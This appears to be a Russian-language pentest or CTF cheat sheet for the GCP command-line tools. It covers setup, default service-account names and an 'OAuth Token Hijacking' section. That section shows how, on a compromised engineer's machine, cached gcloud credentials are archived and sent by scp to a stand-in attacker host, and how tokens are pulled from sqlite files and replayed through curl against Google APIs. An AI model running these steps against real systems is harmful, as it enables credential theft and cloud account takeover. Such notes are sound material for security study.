# GCP CLI

## Basic

Установка Google Cloud SDK: `brew cask install google-cloud-sdk`

Начинаем: `gcloud init`

Коннект к кластеру\
`gcloud container clusters get-credentials ctfzone --zone europe-west3-a --project civil-partition-256713`

Далее управление через kubectl

## Аккаунты

Формат сервисного аккаунта:

```
{PROJECT_ID}-compute@developer.gserviceaccount.com
```

Для инстансов App Engine, имя аккаунта, по умолчанию:

```
{PROJECT_ID}@appspot.gserviceaccount.com
```

В дополнение, по умолчанию сервисный аккаунт для Computer Engine имеет роль `roles/editor` в GCP проекте.

## OAuth Token Hijacking

links:\
[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)\
[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

Если скомпрометировали тачку инженера

Посмотреть список аутентифицированных акков:

```
$ gcloud auth list

// выставляем нужный акк:
$ gcloud config set account admin@example.com
```

```
$ gcloud projects list
PROJECT_ID        NAME         PROJECT_NUMBER
project-prod-111  project-prod 6464828674
$ gsutil ls -p project-prod-111
gs://sensitive-bucket/
$ gsutil ls gs://sensitive-bucket/
gs://sensitive-bucket/some_folders/
gs://sensitive-bucket/passwords/
...
```

The actual cached credentials are OAuth access and refresh tokens generated during the initial authentication (gcloud auth login). On Linux/macos, [they are stored in](https://www.jhanley.com/google-cloud-where-are-my-credentials-stored/) \~/.config/gcloud, while on Windows they are stored in C:\Users\\\<username>\AppData\Roaming\gcloud.

```
$ ls -al ~/.config/gcloud
...
$ cd ~/.config
$ tar zcf gloud.tgz gcloud
$ scp gcloud.tgz user@my-attack--host-1234.com
```

### Token hijacking for API Calls

```
$ sqlite3 ~/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id = 'admin@example.com';"
ya29.sndkjbdhv.....
$ sqlite3 ~/.config/gcloud/credentials.db "select value from credentials where account_id = 'admin@example.com';"
{
    ...,
    "client_id": "1111.apps.googleusercontent.com",
    ...
}
$ data --date=='@15466...'
```

Использовать токен через RestAPI:

```
curl -s --data client_id=1111.apps.googleusercontent.com --data client_secret=... --data grant_type=refresh_token --data refresh_token=...
--data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth https://www.googleapis.com/oauth2/v4/token"

curl -s -H "Authorization: Bearer ..." https://storage.googleapis.com/storage/v1/b/sensitive-bucket/o
```
